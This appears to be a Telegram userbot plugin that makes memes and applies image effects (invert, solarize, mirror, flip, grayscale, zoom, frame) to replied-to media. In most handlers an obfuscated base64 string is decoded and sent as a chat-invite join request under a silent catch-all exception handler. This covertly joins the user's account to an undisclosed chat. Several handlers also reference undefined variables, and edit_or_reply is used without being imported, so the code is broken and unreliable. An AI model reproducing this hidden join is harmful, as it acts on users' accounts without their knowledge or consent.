"""
Created by @mrconfused and edited by @peru_monster
memify plugin
"""
import asyncio
import os
import random

from ..utils import admin_cmd, sudo_cmd
from . import (
    LOGS,
    add_frame,
    asciiart,
    per_meeme,
    per_meme,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    reply_id,
    runcmd,
    solarize,
    take_screen_shot,
)

from userbot import bot, CMD_HELP
def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]


@bot.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
async def memes(per):
    cmd = per.pattern_match.group(1)
    perinput = per.pattern_match.group(2)
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = per.reply_to_msg_id
    if perinput:
        if ";" in perinput:
            top, bottom = perinput.split(";", 1)
        else:
            top = perinput
            bottom = ""
    else:
        await edit_or_reply(
            per, "```give some text```"
        )
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "permeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await per_meme(top, bottom, meme_file, meme)
    else:
        await per_meeme(top, bottom, meme_file, meme)
    if cmd != "mmf":
        meme = await convert_tosticker(meme)
    await per.client.send_file(per.chat_id, meme, reply_to=perid)
    await per.delete()
    os.remove(meme)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
async def memes(per):
    perinput = per.pattern_match.group(1)
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = await reply_id(per)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
        webidea = True
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to asci image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    meme_file = convert_toimage(meme_file)
    outputfile = "ascii_file.webp" if webidea else "ascii_file.jpg"
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not perinput else perinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await per.client.send_file(per.chat_id, outputfile, reply_to=perid)
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="invert$", outgoing=True))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
        webidea = True
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if webidea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await per.client.send_file(
        per.chat_id, outputfile, force_document=False, reply_to=perid
    )
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
        webidea = True
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if webidea else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await per.client.send_file(
        per.chat_id, outputfile, force_document=False, reply_to=perid
    )
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
        webidea = True
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if webidea else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await per.client.send_file(
        per.chat_id, outputfile, force_document=False, reply_to=perid
    )
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="flip$"))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
        webidea = True
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if webidea else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await per.client.send_file(
        per.chat_id, outputfile, force_document=False, reply_to=perid
    )
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="gray$"))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(pert, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
        webidea = True
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if webidea else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await per.client.send_file(
        per.chat_id, outputfile, force_document=False, reply_to=perid
    )
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    perinput = per.pattern_match.group(1)
    perinput = 50 if not cpernput else int(perinput)
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(percmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if webidea else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, perinput)
    except Exception as e:
        return await per.edit(f"`{e}`")
    try:
        await per.client.send_file(
            per.chat_id, outputfile, force_document=False, reply_to=perid
        )
    except Exception as e:
        return await per.edit(f"`{e}`")
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
async def memes(per):
    reply = await per.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(per, "`Reply to supported Media...`")
        return
    catinput = per.pattern_match.group(1)
    if not perinput:
        perinput = 50
    if ";" in str(perinput):
        perinput, colr = perinput.split(";", 1)
    else:
        colr = 0
    perinput = int(perinput)
    colr = int(colr)
    perid = per.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    per = await edit_or_reply(per, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    persticker = await reply.download_media(file="./temp/")
    if not persticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(persticker)
        await edit_or_reply(per, "```Supported Media not found...```")
        return
    import pybase64

    webidea = None
    if persticker.endswith(".tgs"):
        await per.edit(
            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "meme.png")
        percmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {persticker} {perfile}"
        )
        stdout, stderr = (await runcmd(pertcmd))[:2]
        if not os.path.lexists(perfile):
            await per.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = perfile
        webidea = True
    elif persticker.endswith(".webp"):
        await per.edit(
            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        os.rename(persticker, perfile)
        if not os.path.lexists(perfile):
            await per.edit("`Template not found... `")
            return
        meme_file = perfile
        webidea = True
    elif persticker.endswith((".mp4", ".mov")):
        await per.edit(
            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
        )
        perfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(persticker, 0, perfile)
        if not os.path.lexists(perfile):
            await per.edit("```Template not found...```")
            return
        meme_file = perfile
    else:
        await per.edit(
            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = persticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await per.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if webidea else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, perinput, colr)
    except Exception as e:
        return await per.edit(f"`{e}`")
    try:
        await per.client.send_file(
            per.chat_id, outputfile, force_document=False, reply_to=perid
        )
    except Exception as e:
        return await per.edit(f"`{e}`")
    await per.delete()
    os.remove(outputfile)
    for files in (persticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "memify": "**Plugin : **`memify`\
    \n\n**Syntax :** `.mmf toptext ; bottomtext`\
    \n**Function : **Creates a image meme with give text at specific locations and sends\
    \n\n**Syntax : **`.mms toptext ; bottomtext`\
    \n**Function : **Creates a sticker meme with give text at specific locations and sends\
    \n\n**Syntax : **`.ascii`\
    \n**Function : **reply to media file to get ascii image of that media\
    \n\n**Syntax : **`.invert`\
    \n**Function : **Inverts the colors in media file\
    \n\n**Syntax : **`.solarize`\
    \n**Function : **Watch sun buring ur media file\
    \n\n**Syntax : **`.mirror`\
    \n**Function : **shows you the reflection of the media file\
    \n\n**Syntax : **`.flip`\
    \n**Function : **shows you the upside down image of the given media file\
    \n\n**Syntax : **`.gray`\
    \n**Function : **makes your media file to black and white\
    \n\n**Syntax : **`.zoom` or `.zoom range`\
    \n**Function : **zooms your media file\
    \n\n**Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
    \n**Function : **make a frame for your media file\
    \n**fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
    "
    }
)
